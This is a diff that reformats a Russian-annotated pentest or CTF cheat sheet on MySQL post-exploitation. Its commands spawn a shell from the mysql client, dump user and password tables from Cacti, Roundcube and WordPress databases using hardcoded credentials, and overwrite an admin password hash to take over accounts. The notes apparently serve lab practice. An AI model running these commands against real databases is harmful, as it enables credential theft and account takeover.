@@ -59,32 +59,31 @@ mysql -u bolt_dba -p
 
         запуск оболочки \! /bin/sh
 
-SHOW databases; : Prints out the databases we can access.
-USE {database_name}; : Set to use the database named {database_name}.
-SHOW tables; : Prints out the available tables inside the current
-database.
-SELECT * FROM {table_name}; : Prints out all the data from the table {table_name}.
-describe Users;
-update {table_name} set {user_pass} = MD5('password123') where ID = 1;
+    SHOW databases; : Prints out the databases we can access.
+    USE {database_name}; : Set to use the database named {database_name}.
+    SHOW tables; : Prints out the available tables inside the current database.
+    SELECT * FROM {table_name}; : Prints out all the data from the table {table_name}.
+    describe Users;
+    update {table_name} set {user_pass} = MD5('password123') where ID = 1;
 
 # Подключение к mysql из нутри
 
-mysql --host=db --user=root --password=root cacti -e "show tables"
-mysql --host=db --user=root --password=root cacti -e "select * from user_auth"
+    mysql --host=db --user=root --password=root cacti -e "show tables"
+    mysql --host=db --user=root --password=root cacti -e "select * from user_auth"
+    
+    mysql --user=root -p 
 
-mysql --user=root -p 
+    mysql -u 'roundcube' -p'RCDBPass2025' roundcube -e "show tables; select * from users "
 
-mysql -u 'roundcube' -p'RCDBPass2025' roundcube -e "show tables; select * from users "
+    select * from wp_users \G (в удобном виде)
 
-select * from wp_users \G (в удобном виде)
+    update wp_users set user_pass='$P$Bn.uHsPKseIJ4CdDVxOiQKmXFHrkC1.' where id=1;
 
-update wp_users set user_pass='$P$Bn.uHsPKseIJ4CdDVxOiQKmXFHrkC1.' where id=1;
-
-update (tables_name) set (column_password_nmae)='$P$Bn.uHsPKseIJ4CdDVxOiQKmXFHrkC1.' where id=1;
+    update (tables_name) set (column_password_nmae)='$P$Bn.uHsPKseIJ4CdDVxOiQKmXFHrkC1.' where id=1;
 
 # MySqlDUMP
 
-mysqldump -u theseus(user) -p Magic(datab)
+    mysqldump -u theseus(user) -p Magic(datab)
 
 
 
